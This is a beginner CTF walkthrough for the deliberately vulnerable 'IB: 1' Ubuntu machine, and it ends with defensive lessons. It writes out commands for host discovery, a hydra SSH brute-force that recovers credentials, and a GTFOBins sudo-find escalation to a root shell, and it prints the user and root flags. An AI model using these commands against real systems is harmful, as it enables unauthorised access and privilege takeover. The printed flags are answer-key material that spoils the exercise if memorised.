# IB-Series-CTF
IB Series 1 CTF Write-up | Linux Penetration Testing | Network Enumeration | SSH Credential Attack | Sudo Misconfiguration | Privilege Escalation

# IB Series 1 - CTF Walkthrough

A beginner-friendly Capture The Flag (CTF) writeup for the **IB: 1** machine. This box runs on Ubuntu 14.04.5 LTS and involves SSH brute-forcing plus a sudo misconfiguration for privilege escalation.

# Machine Info

| Detail | Value |
|---|---|
| IP Address | 10.10.10.5 |
| Hostname | ian |
| OS | Ubuntu 14.04.5 LTS |
| Domain | N/A |
| Credentials | None given |
| Responds to ICMP | Yes |
| Firewalled | No |

## Tools Used

- `arp-scan` - find live hosts on the network
- `nmap` - scan for open ports and services
- `hydra` - brute-force SSH login
- SSH client
- `sudo` / GTFOBins - privilege escalation

---

## 1. Enumeration

### Find the target on the network

```bash
sudo arp-scan --localnet
```

This showed the target machine at `10.10.10.5`.

### Scan for open ports

```bash
sudo nmap 10.10.10.5
```

Result:

| Port | State | Service |
|---|---|---|
| 22 | open | ssh |
| 80 | open | http |

Since port 80 was open, the website was checked in a browser. A hint was found on the page pointing to a username, disguised using the NATO phonetic alphabet:

```
BRAVOECHOLIMALIMA -> bell
```

---

## 2. Exploitation

### Brute-force SSH login

With the username `bell` found from the web hint, `hydra` was used with the `rockyou.txt` wordlist to guess the password over SSH.

```bash
sudo hydra -l bell -P rockyou.txt ssh://10.10.10.5
```

Result:

```
[22][ssh] host: 10.10.10.5   login: bell   password: shadow
```

**Credentials found:** `bell : shadow`

### Log in over SSH

```bash
ssh bell@10.10.10.5
```

### Grab the user flag

```bash
ls
cat userflag.txt
```

**User flag:**
```
f4e690f638c01bd8a19fb1349d40519c
```

---

## 3. Privilege Escalation

Checking sudo permissions showed that the `bell` user could run `find` as root without a password. Looking this up on [GTFOBins](https://gtfobins.org/) revealed a known technique to spawn a root shell using `find`.

```bash
sudo find / -exec /bin/bash \;
```

This dropped into a root shell:

```bash
whoami
# root
```

### Grab the root flag

```bash
cd /root
ls
cat rootflag.txt
```

**Root flag:**
```
c8aaf0f3189e000006c305bbfcbeb790
```

---

## Summary

| Step | Technique |
|---|---|
| Recon | `arp-scan`, `nmap` |
| Initial foothold | Username leaked on web page, password cracked via SSH brute-force (hydra + rockyou.txt) |
| Privilege escalation | Misconfigured `sudo` rule allowing `find` to be run as root (GTFOBins technique) |

## Flags

- **User Flag:** `f4e690f638c01bd8a19fb1349d40519c`
- **Root Flag:** `c8aaf0f3189e000006c305bbfcbeb790`

## Lessons / Takeaways

- Don't hide usernames or hints in publicly accessible web pages.
- Enforce strong, unique passwords to resist dictionary attacks.
- Avoid giving `sudo` access to binaries like `find`, `vim`, `less`, etc. that can be abused to spawn a shell — check [GTFOBins](https://gtfobins.org/) before granting sudo rules.

---

*This writeup is for educational purposes only, documenting a deliberately vulnerable practice machine.*
